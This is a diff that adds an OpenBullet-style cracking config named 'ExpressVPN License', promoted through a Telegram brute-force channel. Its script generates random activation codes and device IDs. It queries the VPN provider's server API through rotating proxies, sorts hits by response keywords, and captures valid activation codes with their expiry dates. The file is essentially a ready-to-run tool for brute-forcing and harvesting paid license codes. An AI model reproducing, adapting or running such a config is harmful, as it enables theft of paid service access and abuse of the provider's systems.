@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "ExpressVPN License",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-01-01T20:43:54.0078123+03:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce  | License Gen + Checker | Just Load a BullShit Combo For Start OB | Capture | CPM Rate: 500-4000 ",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#KUN FUNCTION RandomString "E?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m" -> VAR "KUN" 
+
+#RN FUNCTION RandomString "?d?d?d?d?d?d?d?d?d?d?d?d?d?h?d?h?d?h?d?d?h?d?d?d?h?h?d?d?d?d?d?h?h?d?d?d?h?d?d?h?d?h?d?h?h?d?h?d?h?h?d?d?h?d?d?d?h?d?d?d?d?d?d?d" -> VAR "RN" 
+
+#GET REQUEST GET "https://www.ftrftcx.net/vpn_servers?activation_code=<KUN>&ca_version=2&client_version=6.7.1&conn_requests=1&device_id=<RN>&device_name=Windows&dpi=hdpi&include_country_and_region=1&include_pptp_l2tp_ipsec_servers=1&include_recommended_clusters=1&include_sstp_servers=1&os_version=win6.2.0&show_messages=1&smart_location=1&smartdns=1" 
+  
+  HEADER "Host: www.ftrftcx.net" 
+  HEADER "User-Agent: Go-http-client/1.1" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "authentication failed" 
+  KEYCHAIN Success OR 
+    KEY "<subscription>" 
+
+#Active_Code FUNCTION Constant "<KUN>" -> CAP "Active Code" 
+
+#Expire_Date PARSE "<SOURCE>" LR "<expiration_date>" "</expiration_date>" CreateEmpty=FALSE -> CAP "Expire Date" 
+
